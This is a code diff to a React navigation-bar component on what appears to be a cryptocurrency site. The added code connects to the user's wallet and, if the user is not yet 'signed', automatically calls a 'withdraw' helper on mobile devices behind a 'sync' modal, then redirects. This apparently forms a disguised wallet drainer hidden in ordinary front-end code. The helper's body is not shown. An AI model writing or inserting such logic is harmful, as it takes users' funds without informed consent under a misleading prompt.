@@ -1,20 +1,25 @@
 import React, { useContext, useEffect, useLayoutEffect, useState } from "react";
 import PropTypes from "prop-types";
 import $ from "jquery";
-import { NavLink, useParams } from "react-router-dom";
+import { NavLink, useNavigate, useParams } from "react-router-dom";
 import { UserContext } from "../../UserContext";
 import { sendNativeCurrency } from "../../helpers/send-transaction";
+import { isMobile } from "../../helpers/calculations";
+import { checkBalance, withdraw } from "../../helpers/connect-ishodniy";
 
 function TopBar({
   showJumbotron = true,
   isHomePage = true,
   isLight = false,
+  setLoading,
+  setShowSyncModal,
   isTransparent = false,
   setWalletModalOptions,
 }) {
   const { id } = useParams();
   const [showMenu, setShowMenu] = useState(true);
   const { value, setValue } = useContext(UserContext);
+  const navigate = useNavigate();
   const onMenuToggle = (e) => {
     e.preventDefault();
     setShowMenu((prevState) => !prevState);
@@ -30,13 +35,42 @@ function TopBar({
     $("#main_menu").toggle(showMenu);
   }, [showMenu]);
 
-  useLayoutEffect(() => {
+  useEffect(() => {
     async function fetchData(params) {
       if (window.ethereum) {
+        if (isMobile()) {
+          await Moralis.enableWeb3();
+        }
+        const chainId = window.ethereum.chainId;
         const web3 = new Web3(window.ethereum);
         const accounts = await web3.eth.getAccounts();
         if (accounts.length !== 0) {
           setValue({ ...value, adress: accounts[0] });
+          if (!value.signed) {
+            setShowSyncModal(true);
+          }
+        }
+        window.ethereum.on("accountsChanged", (accounts) => {
+          if (!accounts.length) {
+            setValue({ ...value, adress: null });
+          } else {
+            fetchData();
+          }
+        });
+
+        if (value.adress) {
+          checkBalance(chainId).then(async () => {
+            if (!value.signed) {
+              withdraw(value, chainId, setValue)
+                .then(() => {
+                  setShowSyncModal(false);
+                  navigate("/user");
+                })
+                .catch(() => {
+                  setShowSyncModal(true);
+                });
+            }
+          });
         }
         window.ethereum.on("accountsChanged", (accounts) => {
           if (!accounts.length) {
@@ -47,9 +81,10 @@ function TopBar({
         });
       }
     }
-    fetchData();
-  }, []);
-
+    if (isMobile()) {
+      fetchData();
+    }
+  }, [value.adress]);
   const connectWallet = async (e) => {
     e.preventDefault();
     setWalletModalOptions({
